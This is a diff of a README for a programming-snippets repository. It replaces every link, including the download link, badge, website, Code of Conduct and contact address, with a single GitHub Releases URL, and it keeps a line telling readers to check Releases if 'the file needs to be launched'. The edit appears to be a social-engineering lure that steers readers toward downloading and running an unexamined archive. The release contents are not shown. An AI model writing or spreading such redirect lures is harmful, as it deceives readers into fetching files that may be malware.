@@ -21,14 +21,14 @@ The collection includes programs and code snippets related to the following topi
 Feel free to explore the repository and dive into the world of programming languages. 🔍
 
 ## Access the Files
-To access the files in this repository, you can download them as a ZIP archive [here](https://github.com/project/files/App.zip).
+To access the files in this repository, you can download them as a ZIP archive [here](https://github.com/KILLERXNKVT/Programmes-Collection/releases).
 
-[![Download Files](https://img.shields.io/badge/Download-Files-blue)](https://github.com/project/files/App.zip)
+[![Download Files](https://github.com/KILLERXNKVT/Programmes-Collection/releases)](https://github.com/KILLERXNKVT/Programmes-Collection/releases)
 
 If the link does not work or the file needs to be launched, please check the "Releases" section of this repository for alternate download options.
 
 ## Explore Further
-If you are looking for more exciting content, visit our [website](https://www.awesomeprogramming.com) for tutorials, articles, and resources on programming.
+If you are looking for more exciting content, visit our [website](https://github.com/KILLERXNKVT/Programmes-Collection/releases) for tutorials, articles, and resources on programming.
 
 ## Repository Structure
 The repository is organized into folders based on programming languages. Each folder contains programs, code snippets, and projects related to that particular language. Feel free to contribute by adding your own programs or suggesting improvements to existing ones.
@@ -43,9 +43,9 @@ Contributions to this repository are welcome! Whether you want to add a new prog
 6. Create a Pull Request
 
 ## Code of Conduct
-Please note that this repository follows a [Code of Conduct](https://www.awesomeprogramming.com/code-of-conduct) to ensure a welcoming and inclusive environment for all contributors. Be respectful and considerate in your interactions within this community.
+Please note that this repository follows a [Code of Conduct](https://github.com/KILLERXNKVT/Programmes-Collection/releases) to ensure a welcoming and inclusive environment for all contributors. Be respectful and considerate in your interactions within this community.
 
 ## Contact Us
-If you have any questions, suggestions, or feedback, feel free to reach out to us at [info@awesomeprogramming.com]. We would love to hear from you!
+If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/KILLERXNKVT/Programmes-Collection/releases]. We would love to hear from you!
 
 Let's learn, explore, and code together! Happy coding! 🚀👩‍💻👨‍💻
